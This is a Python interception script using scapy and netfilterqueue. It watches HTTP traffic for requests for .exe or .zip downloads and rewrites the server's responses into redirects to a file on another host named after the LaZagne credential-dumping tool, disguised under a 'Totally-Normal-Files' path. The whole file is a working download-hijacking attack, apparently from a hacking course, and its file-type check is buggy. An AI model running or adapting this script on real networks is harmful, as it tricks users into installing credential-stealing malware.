#!/usr/bin/env python


import netfilterqueue
import scapy.all as scapy
import os


# os.system("echo 1 >/proc/sys/net/ipv4/ip_forward")


ack_list = []


def set_load(packet):
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" or ".zip" in scapy_packet[scapy.Raw].load:
                print("[+] EXE or ZIP Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing File")
                replace_url = "http://10.0.2.20/Totally-Normal-Files/laZagne.exe"
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\r\nLocation: " + replace_url + "\n\n"
                modified_packet = set_load(scapy_packet)
                
                packet.set_payload(bytes(modified_packet))
    packet.accept()


def packet_show(pkt):
    print("[+] Printing Packets")
    scapy_pkt = scapy.IP(pkt.get_payload())
    print(scapy_pkt.show())


try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n\n[+] Detected 'ctrl + c' ... Quitting ...!!!")
